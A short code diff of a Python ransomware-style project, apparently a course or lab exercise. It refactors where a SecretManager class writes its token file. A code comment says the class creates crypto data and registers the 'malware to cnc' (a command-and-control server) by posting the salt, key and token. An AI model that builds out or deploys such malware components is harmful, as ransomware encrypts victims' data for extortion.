@@ -13,7 +13,6 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
 
-TOKEN_PATH = "/root/token"
 
 class SecretManager:
     KDF_ITERATION_NUMBER = 48000
@@ -66,14 +65,14 @@ class SecretManager:
         # main function to create crypto data and register malware to cnc
         self.create()
         self.post_new(self._salt, self._key, self._token)
-        if not Path(TOKEN_PATH).exists():  
-            Path(TOKEN_PATH).mkdir(parents=True, exist_ok=True)
-        if Path(TOKEN_PATH + '/token.bin').exists():
+        if not Path(self._path).exists():  
+            Path(self._path).mkdir(parents=True, exist_ok=True)
+        if Path(self._path + '/token.bin').exists():
             raise FileExistsError
         """
         open taking parameter 'wb' allows the program to write into a binary file
         """
-        with open(TOKEN_PATH + '/token.bin', 'wb') as token_binary_file:
+        with open(self._path + '/token.bin', 'wb') as token_binary_file:
             token_binary_file.write(self._token)
 
         return None
